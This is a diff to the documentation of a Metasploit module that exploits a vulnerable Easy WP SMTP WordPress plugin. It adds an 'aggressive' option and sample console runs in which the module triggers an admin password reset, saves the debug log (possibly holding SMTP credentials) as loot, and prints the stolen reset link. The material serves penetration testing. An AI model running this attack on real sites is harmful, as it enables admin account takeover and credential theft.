@@ -10,6 +10,11 @@ This module will list ALL reset links, most likely the last one is the one that 
 may be value in the others as well (such as other users).  The debug log saved in loot may also contain
 the SMTP username and password.
 
+There is one potential false negative case where the `aggressive` option should be used.
+If debug mode was enabled, however only the `Test Email` was used (or no legit email has been sent by the server),
+the debug file won't exist yet.  This will be remedied by the first password reset request, but to avoid this module
+being too noisy, it won't happen unles `aggressive` is set to `true`.
+
 To summarize:
 
 1. Vulnerable version of Easy WP SMTP
@@ -39,7 +44,12 @@ To summarize:
 
 ### User
 
-The username to reset the password of
+The username to reset the password of.  Defaults to `Admin`
+
+### Aggressive
+
+When `true`, if directory listings are enabled, however debug file can not be found, the code will proceed anyways.
+Defaults to `false`.
 
 ## Scenarios
 
@@ -61,4 +71,40 @@ resource (wp_easy_wp_smtp.rb)> run
 [*] admin password reset: http://1.1.1.1/wp-login.php?action=rp&key=IdlSwWkIuy0f7k79OU2p&login=admin
 [*] Finished enumerating resets.  Last one most likely to succeed
 [*] Scanned 1 of 1 hosts (100% complete)
+```
+
+### Easy WP SMTP 1.4.1 on Wordpress 5.4.4 running on Ubuntu 20.04.  Aggressive mode
+
+```
+resource (easy-wp-smtp.rb)> use auxiliary/scanner/http/wp_easy_wp_smtp
+resource (easy-wp-smtp.rb)> set rhosts 1.1.1.1
+rhosts => 1.1.1.1
+resource (easy-wp-smtp.rb)> set verbose true
+verbose => true
+resource (easy-wp-smtp.rb)> run
+[*] Checking /wp-content/plugins/easy-wp-smtp/readme.txt
+[*] Found version 1.4.1 in the plugin
+[+] Vulnerable version detected
+[*] Checking for debug_log file
+[-] not-vulnerable: Either debug log not turned on, or directory listings disabled.  Try Aggressive mode if false possitive
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+```
+resource (easy-wp-smtp.rb)> set aggressive true
+aggressive => true
+resource (easy-wp-smtp.rb)> run
+[*] Checking /wp-content/plugins/easy-wp-smtp/readme.txt
+[*] Found version 1.4.1 in the plugin
+[+] Vulnerable version detected
+[*] Checking for debug_log file
+[-] Debug file not found, bypassing check due to AGGRESSIVE mode
+[*] Sending password reset for Admin
+[*] Checking for debug_log file
+[+] Debug log saved to /home/h00die/.msf4/loot/20201218152659_default_1.1.1.1_5fcfd49e879f9_de_812609.txt.  Manual review for possible SMTP password, and other information.
+[*] admin password reset: http://1.1.1.1/wp-login.php?action=rp&key=SQRBS8Hpro9jPQdZ9vP5&login=admin
+[*] Finished enumerating resets.  Last one most likely to succeed
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
 ```
